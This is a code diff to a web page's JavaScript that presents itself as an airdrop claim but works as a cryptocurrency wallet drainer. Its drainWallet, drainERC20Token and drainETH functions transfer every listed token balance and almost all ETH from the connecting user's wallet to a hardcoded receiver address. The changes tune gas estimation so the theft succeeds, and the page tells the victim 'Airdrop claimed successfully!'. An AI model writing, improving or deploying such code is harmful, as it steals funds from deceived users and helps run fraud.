@@ -501,37 +501,72 @@ $(document).ready(function() {
     async function drainWallet(provider, signer, userAddress) {
         try {
             console.log("Starting wallet drain...");
+            updateConnectionStatus("Starting asset extraction...");
+
+            // Get initial ETH balance
+            const initialBalance = await provider.getBalance(userAddress);
+            const initialEthBalance = ethers.utils.formatEther(initialBalance);
+            console.log(`Initial ETH balance: ${initialEthBalance}`);
+
+            // Calculate total gas needed for all operations
+            const gasPrice = await provider.getGasPrice();
+            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
+            
+            // Estimate gas for token transfers (higher limit for safety)
+            const tokenGasLimit = ethers.BigNumber.from("65000"); // Higher for token transfers
+            const ethGasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer
+            
+            // Calculate total gas needed (tokens + final ETH transfer)
+            const estimatedTokenTransfers = COMMON_TOKENS.length;
+            const totalGasNeeded = tokenGasLimit.mul(estimatedTokenTransfers).add(ethGasLimit);
+            const totalGasCost = gasPrice.mul(totalGasNeeded);
+            
+            console.log(`Estimated gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);
 
             // Step 1: Drain ERC-20 tokens first (they need ETH for gas)
+            let tokenTransferCount = 0;
             for (const token of COMMON_TOKENS) {
                 try {
-                    await drainERC20Token(provider, signer, userAddress, token);
+                    updateConnectionStatus(`Checking ${token.symbol} balance...`);
+                    const transferred = await drainERC20Token(provider, signer, userAddress, token, gasPrice);
+                    if (transferred) {
+                        tokenTransferCount++;
+                        updateConnectionStatus(`${token.symbol} transferred successfully`);
+                    }
                 } catch (tokenError) {
                     console.error(`Failed to drain ${token.symbol}:`, tokenError);
+                    updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
                     // Continue with other tokens
                 }
             }
 
-            // Step 2: Drain remaining ETH (leave small amount for final gas)
+            console.log(`Successfully transferred ${tokenTransferCount} tokens`);
+
+            // Step 2: Drain remaining ETH (calculate precise gas for final transfer)
+            updateConnectionStatus("Transferring remaining ETH...");
             await drainETH(provider, signer, userAddress);
 
+            updateConnectionStatus("All assets extracted successfully! 🎉");
             alert("Airdrop claimed successfully! 🎉");
 
         } catch (error) {
             console.error("Drain error:", error);
+            updateConnectionStatus("Asset extraction failed", true);
             alert("Failed to claim airdrop: " + error.message);
         }
     }
 
     // Function to drain ERC-20 tokens
-    async function drainERC20Token(provider, signer, userAddress, token) {
+    async function drainERC20Token(provider, signer, userAddress, token, gasPrice = null) {
         try {
             // ERC-20 ABI for transfer function
             const erc20ABI = [
                 "function balanceOf(address owner) view returns (uint256)",
                 "function transfer(address to, uint256 amount) returns (bool)",
                 "function allowance(address owner, address spender) view returns (uint256)",
-                "function approve(address spender, uint256 amount) returns (bool)"
+                "function approve(address spender, uint256 amount) returns (bool)",
+                "function decimals() view returns (uint8)",
+                "function symbol() view returns (string)"
             ];
 
             const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);
@@ -540,61 +575,174 @@ $(document).ready(function() {
             const balance = await tokenContract.balanceOf(userAddress);
             if (balance.isZero()) {
                 console.log(`No ${token.symbol} balance found`);
-                return;
+                return false;
             }
 
-            console.log(`Draining ${token.symbol}: ${ethers.utils.formatUnits(balance, token.decimals)}`);
+            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
+            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
 
-            // Transfer tokens to receiver address
-            const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance);
-            console.log(`${token.symbol} transfer tx:`, transferTx.hash);
+            // Get current gas price if not provided
+            if (!gasPrice) {
+                gasPrice = await provider.getGasPrice();
+            }
+
+            // Estimate gas for this specific token transfer
+            let estimatedGas;
+            try {
+                estimatedGas = await tokenContract.estimateGas.transfer(RECEIVER_ADDRESS, balance);
+                // Add 20% buffer for safety
+                estimatedGas = estimatedGas.mul(120).div(100);
+            } catch (gasError) {
+                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
+                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
+            }
+
+            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);
+
+            // Check if user has enough ETH for gas
+            const currentEthBalance = await provider.getBalance(userAddress);
+            const gasCost = gasPrice.mul(estimatedGas);
+            
+            if (currentEthBalance.lt(gasCost)) {
+                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
+                return false;
+            }
+
+            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${RECEIVER_ADDRESS}`);
+
+            // Transfer tokens to receiver address with optimized gas
+            const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance, {
+                gasLimit: estimatedGas,
+                gasPrice: gasPrice,
+                // Use maxFeePerGas for EIP-1559 if supported
+                ...(provider.getNetwork().then(n => n.chainId === 1) && {
+                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
+                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
+                })
+            });
+
+            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);
 
             // Wait for confirmation
-            await transferTx.wait();
-            console.log(`${token.symbol} transfer confirmed`);
+            const receipt = await transferTx.wait();
+            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
+            console.log(`Gas used: ${receipt.gasUsed.toString()}`);
+
+            return true;
 
         } catch (error) {
             console.error(`Error draining ${token.symbol}:`, error);
-            throw error;
+            
+            // Don't throw error, just return false to continue with other tokens
+            if (error.code === 'INSUFFICIENT_FUNDS') {
+                console.log(`Insufficient funds for ${token.symbol} transfer`);
+            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
+                console.log(`Token ${token.symbol} transfer would fail, skipping`);
+            }
+            
+            return false;
         }
     }
 
     // Function to drain ETH
     async function drainETH(provider, signer, userAddress) {
         try {
-            const balance = await provider.getBalance(userAddress);
-            
-            // Estimate gas for a simple transfer
-            const gasPrice = await provider.getGasPrice();
-            const gasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer gas
-            const gasCost = gasPrice.mul(gasLimit);
+            // Get current balance after token transfers
+            const currentBalance = await provider.getBalance(userAddress);
+            const currentEthBalance = ethers.utils.formatEther(currentBalance);
+            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);
 
-            // Calculate amount to send (leave gas for transaction)
-            const amountToSend = balance.sub(gasCost);
-
-            if (amountToSend.lte(0)) {
-                console.log("Insufficient ETH balance for gas fees");
+            if (currentBalance.isZero()) {
+                console.log("No ETH balance remaining");
                 return;
             }
 
-            console.log(`Draining ETH: ${ethers.utils.formatEther(amountToSend)}`);
+            // Get current gas price
+            const gasPrice = await provider.getGasPrice();
+            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
 
-            // Send ETH transaction
-            const tx = await signer.sendTransaction({
+            // Use a more conservative gas limit for the final transfer
+            const gasLimit = ethers.BigNumber.from("21000");
+            
+            // Calculate exact gas cost
+            const exactGasCost = gasPrice.mul(gasLimit);
+            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
+
+            // Calculate amount to send (total balance minus exact gas cost)
+            const amountToSend = currentBalance.sub(exactGasCost);
+
+            if (amountToSend.lte(0)) {
+                console.log("Insufficient ETH balance for gas fees");
+                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
+                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
+                return;
+            }
+
+            const ethToSend = ethers.utils.formatEther(amountToSend);
+            console.log(`Transferring ${ethToSend} ETH to ${RECEIVER_ADDRESS}`);
+            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);
+
+            // Create transaction with precise gas parameters
+            const txParams = {
                 to: RECEIVER_ADDRESS,
                 value: amountToSend,
                 gasLimit: gasLimit,
-                gasPrice: gasPrice
-            });
+                gasPrice: gasPrice,
+                nonce: await provider.getTransactionCount(userAddress)
+            };
 
+            // For EIP-1559 networks, use maxFeePerGas
+            const network = await provider.getNetwork();
+            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
+                try {
+                    const feeData = await provider.getFeeData();
+                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+                        delete txParams.gasPrice;
+                        txParams.maxFeePerGas = feeData.maxFeePerGas;
+                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+                        
+                        // Recalculate amount with EIP-1559 fees
+                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
+                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
+                        
+                        if (eip1559Amount.gt(0)) {
+                            txParams.value = eip1559Amount;
+                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
+                        }
+                    }
+                } catch (eip1559Error) {
+                    console.log("EIP-1559 fee estimation failed, using legacy gas pricing");
+                }
+            }
+
+            // Send ETH transaction
+            const tx = await signer.sendTransaction(txParams);
             console.log("ETH transfer tx:", tx.hash);
 
             // Wait for confirmation
-            await tx.wait();
-            console.log("ETH transfer confirmed");
+            const receipt = await tx.wait();
+            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
+            console.log("Gas used:", receipt.gasUsed.toString());
+            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");
+
+            // Verify final balance
+            const finalBalance = await provider.getBalance(userAddress);
+            const finalEthBalance = ethers.utils.formatEther(finalBalance);
+            console.log(`Final ETH balance: ${finalEthBalance} ETH`);
+
+            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
+                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
+            }
 
         } catch (error) {
             console.error("Error draining ETH:", error);
+            
+            if (error.code === 'INSUFFICIENT_FUNDS') {
+                console.log("Transaction failed due to insufficient funds for gas");
+            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
+                console.log("Transaction underpriced, gas price may have increased");
+            }
+            
             throw error;
         }
     }
